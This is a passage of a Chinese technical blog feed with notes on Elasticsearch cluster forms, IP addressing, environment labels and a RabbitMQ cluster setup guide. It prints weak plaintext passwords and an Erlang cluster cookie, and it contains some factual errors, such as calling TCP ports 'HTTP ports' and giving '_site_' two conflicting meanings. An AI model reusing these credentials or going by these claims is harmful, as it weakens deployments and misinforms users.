特性）</h2><table><thead><tr><th>集群类型</th><th>特点</th><th>使用场景</th></tr></thead><tbody><tr><td><strong>主从集群</strong></td><td>架构简单，读写分离</td><td>数据库读多写少</td></tr><tr><td><strong>主主集群</strong></td><td>写入灵活，但冲突处理复杂</td><td>高可用、可扩写系统</td></tr><tr><td><strong>对等集群</strong></td><td>横向扩展好，无单点</td><td>日志、搜索、大数据处理</td></tr><tr><td><strong>仲裁集群</strong></td><td>强一致，适合协调</td><td>分布式锁、配置同步</td></tr><tr><td><strong>调度集群</strong></td><td>资源池化 + 任务调度</td><td>容器编排、集群管理</td></tr></tbody></table><hr><h2 id="🧠-如果你在思考："><a href="#🧠-如果你在思考：" class="headerlink" title="🧠 如果你在思考："></a>🧠 如果你在思考：</h2><ul><li><p><strong>“我选哪种集群？”</strong><br>  → 要看你的业务需求：一致性优先、还是高可用优先？是计算密集型，还是存储密集型？</p></li><li><p><strong>“Elasticsearch 的集群能否跟其他系统兼容？”</strong><br>  → 可以，比如 Kafka + Logstash + ES（日志流转方案），也可以把 ES 数据同步到 ClickHouse 做报表分析。</p></li></ul><hr><p>如果你告诉我你具体在做的系统或者项目目标（比如日志平台、数据库架构、微服务、自动化部署等），我可以帮你精准选型，并分析哪些集群适合你的使用场景。是否需要我来画个表格或者结构图帮你更直观理解？</p><p>明白了，你的问题是：</p><blockquote><p><strong>Elasticsearch 除了它默认的“内置对等集群”，还有没有别的“集群类型”？或者说，ES 的集群架构有没有其他形式？</strong></p></blockquote><p>答案是：</p><hr><h2 id="✅-从官方角度：Elasticsearch-只有一种集群架构"><a href="#✅-从官方角度：Elasticsearch-只有一种集群架构" class="headerlink" title="✅ 从官方角度：Elasticsearch 只有一种集群架构"></a>✅ 从官方角度：Elasticsearch 只有一种集群架构</h2><p>也就是说：<strong>ES 所谓的“集群”指的就是其默认的、内置的</strong>：</p><blockquote><p><strong>对等节点 + 主节点选举 + 分片副本机制</strong> 的这种 <strong>分布式集群模型</strong></p></blockquote><p>它本身没有其他“集群类型模式”可以切换，比如什么“主从模式”或者“轻量集群”这种东西，<strong>集群管理是 Elasticsearch 的核心特性，任何生产部署都建议以集群方式运行，即使是单节点。</strong></p><hr><h2 id="🔧-但根据部署和角色组合的不同，你可以“构建出”不同用途的集群风格："><a href="#🔧-但根据部署和角色组合的不同，你可以“构建出”不同用途的集群风格：" class="headerlink" title="🔧 但根据部署和角色组合的不同，你可以“构建出”不同用途的集群风格："></a>🔧 但根据部署和角色组合的不同，你可以“构建出”不同用途的集群风格：</h2><p>虽然底层原理一样，但根据部署结构、节点角色、容错策略、使用场景不同，ES 的集群可以“表现出”不同的运行方式：</p><h3 id="1-单节点伪集群（开发用）"><a href="#1-单节点伪集群（开发用）" class="headerlink" title="1. 单节点伪集群（开发用）"></a>1. <strong>单节点伪集群</strong>（开发用）</h3><ul><li><p>就一个节点，也运行着 master、data、coordinator 的所有角色。</p></li><li><p>适合本地测试、调试。</p></li><li><p>不是严格意义的“集群”，但依然使用同一套集群机制。</p></li><li><p>可以设置：</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">node.name:</span> <span class="hljs-string">single-node</span><br><span class="hljs-attr">discovery.type:</span> <span class="hljs-string">single-node</span><br></code></pre></td></tr></table></figure></li></ul><hr><h3 id="2-标准高可用集群"><a href="#2-标准高可用集群" class="headerlink" title="2. 标准高可用集群"></a>2. <strong>标准高可用集群</strong></h3><ul><li><p>至少 <strong>3 个 master-eligible 节点</strong>，保证投票机制有效。</p></li><li><p>可添加任意数量的 data 节点。</p></li><li><p>是最常见、最推荐的部署方式。</p></li></ul><hr><h3 id="3-冷热集群（Hot-Warm-Cold-架构）"><a href="#3-冷热集群（Hot-Warm-Cold-架构）" class="headerlink" title="3. 冷热集群（Hot-Warm-Cold 架构）"></a>3. <strong>冷热集群（Hot-Warm-Cold 架构）</strong></h3><ul><li><p>把节点分为“热”、“温”、“冷”：</p><ul><li><p><strong>Hot 节点</strong>：处理实时写入、高频查询，配置高性能磁盘和内存。</p></li><li><p><strong>Warm 节点</strong>：存历史数据，低频访问。</p></li><li><p><strong>Cold 节点</strong>：几乎不访问，仅归档备份。</p></li></ul></li><li><p>通过 ILM（Index Lifecycle Management）策略自动转移索引。</p></li></ul><hr><h3 id="4-跨地域集群（Cross-cluster-replication）"><a href="#4-跨地域集群（Cross-cluster-replication）" class="headerlink" title="4. 跨地域集群（Cross-cluster replication）"></a>4. <strong>跨地域集群（Cross-cluster replication）</strong></h3><ul><li><p>在两个物理集群间做“主从复制”：</p><ul><li><p>主集群：写数据</p></li><li><p>从集群：做灾备、只读访问</p></li></ul></li><li><p>适用于多地容灾、就近访问</p></li></ul><hr><h3 id="5-混合角色集群（Custom-roles）"><a href="#5-混合角色集群（Custom-roles）" class="headerlink" title="5. 混合角色集群（Custom roles）"></a>5. <strong>混合角色集群（Custom roles）</strong></h3><ul><li><p>你可以手动设置节点只承担某些功能，比如：</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">node.master:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">node.data:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">node.ingest:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><ul><li><p>建一个纯 Ingest 节点：只做预处理</p></li><li><p>建一个纯 Master 节点：更稳定地管理集群状态</p></li><li><p>建一些 Coordination-only 节点：当作请求网关</p></li></ul></li></ul><hr><h2 id="🧠-总结："><a href="#🧠-总结：" class="headerlink" title="🧠 总结："></a>🧠 总结：</h2><table><thead><tr><th>角度</th><th>是否存在其他“ES 集群类型”？</th></tr></thead><tbody><tr><td>❌ 从底层架构上看</td><td><strong>没有</strong>，Elasticsearch 只有一种内置集群机制</td></tr><tr><td>✅ 从部署策略上看</td><td><strong>有表现出不同风格的集群形态</strong>（冷热、跨地域、单节点、角色隔离等）</td></tr></tbody></table><hr><p>你是想做什么样的集群部署？是准备上线一个日志系统、业务搜索平台，还是在做集群选型比较？可以告诉我你的目标，我可以推荐适合的 ES 集群结构给你。</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>分布式与微服务</category>
      
      <category>分布式设计原理</category>
      
      <category>CAP 理论</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：IP</title>
    <link href="/2025/04/30/%E7%AC%94%E8%AE%B0%EF%BC%9AIP/"/>
    <url>/2025/04/30/%E7%AC%94%E8%AE%B0%EF%BC%9AIP/</url>
    
    <content type="html"><![CDATA[<p><strong><code>192.168.136.0/24</code></strong> 表示 <strong><code>192.168.136.0</code> 到 <code>192.168.136.255</code></strong> 的 IP 地址范围，总共 256 个地址（包括网络地址和广播地址）。</p><ul><li><p><code>192.168.136.0</code> 是网络地址，表示网络本身。</p></li><li><p><code>192.168.136.255</code> 是广播地址，表示这个网络中的所有设备。</p></li><li><p><strong>有效主机地址</strong> 是从 <code>192.168.136.1</code> 到 <code>192.168.136.254</code>。</p></li></ul><p><code>0.0.0.0</code>：绑定所有接口</p><p>127.0.0.1、localhost：本机、本机回环地址</p><p>192.168.x.x 本地局域网，内网 IP</p><p><code>_site_</code>：监听内网网卡</p><p><code>_global_</code>：监听公网网卡</p><p><code>_site_</code>：本机回环地址,127.0.0.1</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>IP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：环境标识</title>
    <link href="/2025/04/28/%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%8E%AF%E5%A2%83%E6%A0%87%E8%AF%86/"/>
    <url>/2025/04/28/%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%8E%AF%E5%A2%83%E6%A0%87%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th>环境</th><th>环境标识</th><th>使用者</th><th>说明</th></tr></thead><tbody><tr><td>本地环境</td><td><code>local</code></td><td>开发者</td><td>个人开发者在本机或本地容器中用于快速验证和调试。资源有限，随时可启动，数据和配置随实例销毁而丢失，不做持久化。</td></tr><tr><td>开发环境</td><td><code>dev</code></td><td>开发团队</td><td>团队协作开发新功能或联调接口时使用，环境配置可频繁调整，数据可随意增删改，用于功能验证与开发调试，不保证数据完整性和稳定性。</td></tr><tr><td>测试环境</td><td><code>test</code></td><td>QA 测试人员</td><td>QA 在此环境中执行功能测试和回归测试，验证功能正确性和业务流程完整性。环境配置相对稳定，数据可定期重置，用于准确复现测试用例场景。</td></tr><tr><td>压测环境</td><td><code>perf</code></td><td>性能测试工程师</td><td>用于进行大规模并发、压力和性能基准测试，集群配置接近或优于生产环境，支持导入海量脏数据，重点关注系统吞吐量、响应时间和资源占用。测试结束后可整体销毁并重建。</td></tr><tr><td>生产环境</td><td><code>prod</code></td><td>真实用户</td><td>面向外部或内部正式业务的运行环境，配置固定且受严格变更管理，具备高可用部署、监控告警、日志审计及定期备份机制，数据持久化存储，并制定完善的故障恢复和安全策略。</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>环境标识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Mac</title>
    <link href="/2025/04/27/%E7%AC%94%E8%AE%B0%EF%BC%9AMac/"/>
    <url>/2025/04/27/%E7%AC%94%E8%AE%B0%EF%BC%9AMac/</url>
    
    <content type="html"><![CDATA[<h3 id="查看-CPU-架构"><a href="#查看-CPU-架构" class="headerlink" title="查看 CPU 架构"></a>查看 CPU 架构</h3><p><code>x86_64</code>：就是 amd64，<code>aarch64</code>：就是 arm64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -m<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
      <category>Mac</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：RabbitMQ 基础</title>
    <link href="/2025/04/23/%E7%AC%94%E8%AE%B0%EF%BC%9ARabbitMQ%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/04/23/%E7%AC%94%E8%AE%B0%EF%BC%9ARabbitMQ%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARabbitMQ%20%E5%9F%BA%E7%A1%80/PixPin_2025-05-09_15-09-55.png"></p><table><thead><tr><th>特性</th><th>RabbitMQ</th><th>Kafka</th><th>RocketMQ</th><th>ActiveMQ</th></tr></thead><tbody><tr><td>类型</td><td>消息队列（AMQP）</td><td>分布式日志系统</td><td>分布式消息中间件</td><td>传统 JMS 消息队列</td></tr><tr><td>语言</td><td>Erlang</td><td>Scala&#x2F;Java</td><td>Java</td><td>Java</td></tr><tr><td>吞吐</td><td>中等</td><td>极高</td><td>高</td><td>中等偏低</td></tr><tr><td>延迟</td><td>低</td><td>中</td><td>低</td><td>中等</td></tr><tr><td>消息顺序</td><td>支持（某种程度）</td><td>分区内有序</td><td>原生强顺序（可配置）</td><td>有序（但不稳定）</td></tr><tr><td>消息追踪</td><td>无原生支持</td><td>有 offset 可控</td><td>✅ 原生消息轨迹追踪</td><td>❌ 不完善</td></tr><tr><td>消息回溯</td><td>复杂</td><td>✅ 易（offset 回溯）</td><td>✅ 类似 Kafka 的 offset 模型</td><td>❌ 基本不支持</td></tr><tr><td>分布式支持</td><td>集群可配但不天然</td><td>✅ 天然分布式</td><td>✅ 天然支持</td><td>❌ 集群弱，主备为主</td></tr><tr><td>死信队列</td><td>✅ 支持</td><td>需自建逻辑</td><td>✅ 原生支持</td><td>✅ 支持</td></tr><tr><td>社区活跃度</td><td>🔥🔥🔥</td><td>🔥🔥🔥🔥🔥</td><td>🔥🔥</td><td>❄️（Apache 里冷门）</td></tr></tbody></table><h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h1><h3 id="1-单机测试环境搭建"><a href="#1-单机测试环境搭建" class="headerlink" title="1. 单机测试环境搭建"></a>1. 单机测试环境搭建</h3><h4 id="1-1-安装-RabbitMQ"><a href="#1-1-安装-RabbitMQ" class="headerlink" title="1.1. 安装 RabbitMQ"></a>1.1. 安装 RabbitMQ</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>--name rabbitmq <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>-p <span class="hljs-number">5672</span>:<span class="hljs-number">5672</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>-p <span class="hljs-number">15672</span>:<span class="hljs-number">15672</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>-e RABBITMQ_DEFAULT_USER=guest <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>-e RABBITMQ_DEFAULT_PASS=<span class="hljs-number">123456</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>rabbitmq:<span class="hljs-number">3</span>.<span class="hljs-number">13</span>-management<br></code></pre></td></tr></table></figure><hr><h4 id="1-2-访问-RabbitMQ-控制台"><a href="#1-2-访问-RabbitMQ-控制台" class="headerlink" title="1.2. 访问 RabbitMQ 控制台"></a>1.2. 访问 RabbitMQ 控制台</h4><p>访问 RabbitMQ 控制台： <a href="http://192.168.136.7:15672/">http://192.168.136.7:15672</a><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARabbitMQ%20%E5%9F%BA%E7%A1%80/image-20250510173743688.png"></p><hr><h3 id="2-高可用集群搭建"><a href="#2-高可用集群搭建" class="headerlink" title="2. 高可用集群搭建"></a>2. 高可用集群搭建</h3><h4 id="2-1-架构说明"><a href="#2-1-架构说明" class="headerlink" title="2.1. 架构说明"></a>2.1. 架构说明</h4><hr><h4 id="2-2-环境准备"><a href="#2-2-环境准备" class="headerlink" title="2.2. 环境准备"></a>2.2. 环境准备</h4><hr><h4 id="2-3-节点列表"><a href="#2-3-节点列表" class="headerlink" title="2.3. 节点列表"></a>2.3. 节点列表</h4><table><thead><tr><th>IP</th><th>主机名</th></tr></thead><tbody><tr><td>192.168.136.8</td><td>rbmq-node1</td></tr><tr><td>192.168.136.9</td><td>rbmq-node2</td></tr><tr><td>192.168.136.10</td><td>rbmq-node3</td></tr></tbody></table><hr><h4 id="2-4-时间同步"><a href="#2-4-时间同步" class="headerlink" title="2.4. 时间同步"></a>2.4. 时间同步</h4><hr><h4 id="2-5-开放-5672、15672、4369、25672-TCP端口"><a href="#2-5-开放-5672、15672、4369、25672-TCP端口" class="headerlink" title="2.5. 开放 5672、15672、4369、25672 TCP端口"></a>2.5. 开放 5672、15672、4369、25672 TCP端口</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> ufw <span class="hljs-literal">allow</span> <span class="hljs-number">5672</span>/tcp &amp;&amp; sudo ufw <span class="hljs-literal">allow</span> <span class="hljs-number">15672</span>/tcp &amp;&amp; sudo ufw <span class="hljs-literal">allow</span> <span class="hljs-number">4369</span>/tcp &amp;&amp; sudo ufw <span class="hljs-literal">allow</span> <span class="hljs-number">25672</span>/tcp<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>TCP 端口就是我们常说的 HTTP 端口</li></ol></blockquote><hr><h4 id="2-6-设置主机名、主机名互相解析"><a href="#2-6-设置主机名、主机名互相解析" class="headerlink" title="2.6. 设置主机名、主机名互相解析"></a>2.6. 设置主机名、主机名互相解析</h4><p>必须设置，因为后续节点加入集群，需要根据主机名找到中间人，不能根据 IP 地址</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment"># 1. 设置主机名</span><br><span class="hljs-comment"># 1.1. 192.168.136.8</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> <span class="hljs-string">rbmq-node1</span><br><br><span class="hljs-comment"># 1.2. 192.168.136.9</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> <span class="hljs-string">rbmq-node2</span><br><br><span class="hljs-comment"># 1.3. 192.168.136.10</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> <span class="hljs-string">rbmq-node3</span><br><br><br><span class="hljs-comment"># 2. 设置主机名互相解析</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">vim</span> /<span class="hljs-string">etc</span>/<span class="hljs-string">hosts</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">192.168.136.8 rbmq-node1</span><br><span class="hljs-string">192.168.136.9 rbmq-node2</span><br><span class="hljs-string">192.168.136.10 rbmq-node3</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr><h4 id="2-7-安装-RabbitMQ"><a href="#2-7-安装-RabbitMQ" class="headerlink" title="2.7. 安装 RabbitMQ"></a>2.7. 安装 RabbitMQ</h4><p>根据 <a href="https://www.rabbitmq.com/docs/install-debian">RabbitMQ 安装文档</a>，选择合适的版本（3.13），并在每个节点上进行安装。安装方式可选用 <code>Apt with Cloudsmith Mirrors: a Quick Start Script</code> 或 <code>Using Apt with Cloudsmith Mirrors</code>。随后，使用 <code>Debian Package Version and Repository Pinning</code> 限定只从 RabbitMQ 提供的 Cloudsmith 镜像源安装 Erlang，并锁定特定版本的 Erlang 和 RabbitMQ。</p><p>在开始之前，我们先设置一下局部代理，然后开启一下 VM NAT：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=<span class="hljs-string">&quot;http://192.168.68.4:7890&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=<span class="hljs-string">&quot;http://192.168.68.4:7890&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">no_proxy</span>=<span class="hljs-string">&quot;localhost,127.0.0.1,.svc,.cluster.local,192.168.136.0/24,10.96.0.1,10.244.0.0/16&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTP_PROXY</span>=<span class="hljs-variable">$http_proxy</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTPS_PROXY</span>=<span class="hljs-variable">$https_proxy</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">NO_PROXY</span>=<span class="hljs-variable">$no_proxy</span><br></code></pre></td></tr></table></figure><p>然后删除一下之前的 <code>packagecloud.io</code> 和 <code>erlang-solutions.com</code> 的源：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 查找所有涉及 packagecloud.io 和 erlang-solutions.com 的源</span><br>grep -R <span class="hljs-string">&quot;packagecloud\.io\|erlang-solutions\.com&quot;</span> <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list /</span>etc<span class="hljs-regexp">/apt/</span>sources.list.d/*.list<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">root@user-VMware-Virtual-Platform:~# grep -R &quot;packagecloud\.io\|erlang-solutions\.com&quot; /etc/apt/sources.list /etc/apt/sources.list.d/*.list</span><br><span class="hljs-string">/etc/apt/sources.list.d/erlang.list:deb https://packages.erlang-solutions.com/ubuntu noble contrib</span><br><span class="hljs-string">/etc/apt/sources.list.d/rabbitmq_erlang.list:deb https://packagecloud.io/rabbitmq/erlang/ubuntu/ jammy main</span><br><span class="hljs-string">/etc/apt/sources.list.d/rabbitmq_server.list:deb https://packagecloud.io/rabbitmq/rabbitmq-server/ubuntu/ jammy main</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 2. 删除这些源</span><br>sudo rm <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list.d/</span>erlang.list \<br>        <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list.d/</span>rabbitmq_erlang.list \<br>        <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list.d/</span>rabbitmq_server.list<br></code></pre></td></tr></table></figure><p>然后进行 RabbitMQ 的安装：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARabbitMQ%20%E5%9F%BA%E7%A1%80/image-20250513090533397.png"></p><p>以下情况，无需在意，实际上它已经创建了主目录：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARabbitMQ%20%E5%9F%BA%E7%A1%80/image-20250513100716597.png"></p><hr><h4 id="2-8-启用管理界面插件"><a href="#2-8-启用管理界面插件" class="headerlink" title="2.8. 启用管理界面插件"></a>2.8. 启用管理界面插件</h4><p>就是启用我们的后台管理： <a href="http://192.168.136.8:15672/">http://192.168.136.8:15672</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">rabbitmq-plugins <span class="hljs-built_in">enable</span> rabbitmq_management<br></code></pre></td></tr></table></figure><hr><h4 id="2-9-启动第一个节点"><a href="#2-9-启动第一个节点" class="headerlink" title="2.9. 启动第一个节点"></a>2.9. 启动第一个节点</h4><h5 id="2-9-1-启动第一个节点"><a href="#2-9-1-启动第一个节点" class="headerlink" title="2.9.1. 启动第一个节点"></a>2.9.1. 启动第一个节点</h5><p>第一个节点非常重要，后续节点可以通过这个节点作为中间人，从而加入到集群：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-meta"># 1. 启动 RabbitMQ 服务</span><br>systemctl start  rabbitmq-<span class="hljs-keyword">server</span><br><br><br><span class="hljs-meta"># 2. 开机自启动 RabbitMQ 服务</span><br>systemctl enable rabbitmq-<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><hr><h5 id="2-9-2-进行-RabbitMQ-集群基础配置"><a href="#2-9-2-进行-RabbitMQ-集群基础配置" class="headerlink" title="2.9.2. 进行 RabbitMQ 集群基础配置"></a>2.9.2. 进行 RabbitMQ 集群基础配置</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1. 新增登录账号密码</span><br>rabbitmqctl add_user batian wq666666<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">注意：默认账号密码是 guest，不过出于安全考虑，它在配置里被限制为 只能通过 localhost（也就是 127.0.0.1 或 ::1）来连接，所以我们需要新建登录账号密码</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 2. 设置登录账号权限</span><br>rabbitmqctl set_user_tags batian administrator<br><br>rabbitmqctl set_permissions -p / batian <span class="hljs-string">&quot;.*&quot;</span> <span class="hljs-string">&quot;.*&quot;</span> <span class="hljs-string">&quot;.*&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. set_user_tags：</span><br><span class="hljs-string">1. 给 batian 这个用户打上一个或多个 标签（tags）。</span><br><span class="hljs-string">2. administrator：</span><br><span class="hljs-string">1. 管理员权限，能在 Management UI 和 HTTP API 中进行所有管理操作（增删用户、队列、交换机、权限、策略等）</span><br><span class="hljs-string">3. monitoring：</span><br><span class="hljs-string">1. 监控权限，只能查看运行时状态（队列长度、连接、通道、消息速率等），无法做写入或配置操作</span><br><span class="hljs-string">4. policymaker：</span><br><span class="hljs-string">1. 策略管理权限，允许创建、修改和删除策略（policies），但不具备完整的管理或监控权限。</span><br><span class="hljs-string">2. set_permissions：</span><br><span class="hljs-string">1. 给用户在某个 “虚拟主机”（vhost）上的 权限。</span><br><span class="hljs-string">2. -p /：</span><br><span class="hljs-string">1. 表示默认的 “根” vhost（大多数场景都使用 `/`）</span><br><span class="hljs-string">3. &quot;.*&quot; 三个正则：</span><br><span class="hljs-string">1. configure-regex：</span><br><span class="hljs-string">1. 控制“声明”操作（declare/删除队列、交换机、绑定、quorum queue 等）</span><br><span class="hljs-string">2. 例如 ^amq\. 禁止用户操作内建的 amq.* 资源，或者 ^$ 直接不允许任何声明</span><br><span class="hljs-string">2. write-regex：</span><br><span class="hljs-string">1. 控制“写入”操作（publish 消息到交换机或默认交换机）</span><br><span class="hljs-string">2. 例如 ^logs\. 只允许向以 logs. 开头的交换机发送消息</span><br><span class="hljs-string">3. read-regex：</span><br><span class="hljs-string">1. 控制“读取”操作（从队列消费消息、使用 HTTP API 读取队列/交换机信息）</span><br><span class="hljs-string">2. 例如 ^tasks$ 只允许从名为 tasks 的队列中读取消息。</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-comment"># 3. 启用所有稳定功能 flag 启用</span><br>rabbitmqctl enable_feature_flag <span class="hljs-built_in">all</span><br><br><br><span class="hljs-comment"># 4. 重启RabbitMQ服务生效</span><br>systemctl restart rabbitmq-server<br></code></pre></td></tr></table></figure><hr><h4 id="2-10-启动其他节点"><a href="#2-10-启动其他节点" class="headerlink" title="2.10. 启动其他节点"></a>2.10. 启动其他节点</h4><h5 id="2-10-1-查看集群内正常节点的-Erlang-Cookie-值-并记录"><a href="#2-10-1-查看集群内正常节点的-Erlang-Cookie-值-并记录" class="headerlink" title="2.10.1. 查看集群内正常节点的 Erlang Cookie 值 并记录"></a>2.10.1. 查看集群内正常节点的 Erlang Cookie 值 并记录</h5><p>若后续需要将新节点加入集群，只需从当前集群中的任一正常节点获取 Erlang Cookie，并在新节点中使用相同的 Cookie 即可完成身份验证。</p><p>这里我们集群中只有第一个节点，所以查看第一个节点的 Erlang Cookie 值</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 查看 Cookie 值</span><br>vim <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/rabbitmq/</span>.erlang.cookie <br><br><br><span class="hljs-comment"># 2. 记录 Cookie 值</span><br>VAWCBDXAIOWOXLZSBRYS<br></code></pre></td></tr></table></figure><hr><h5 id="2-10-2-加入集群并启动节点"><a href="#2-10-2-加入集群并启动节点" class="headerlink" title="2.10.2. 加入集群并启动节点"></a>2.10.2. 加入集群并启动节点</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 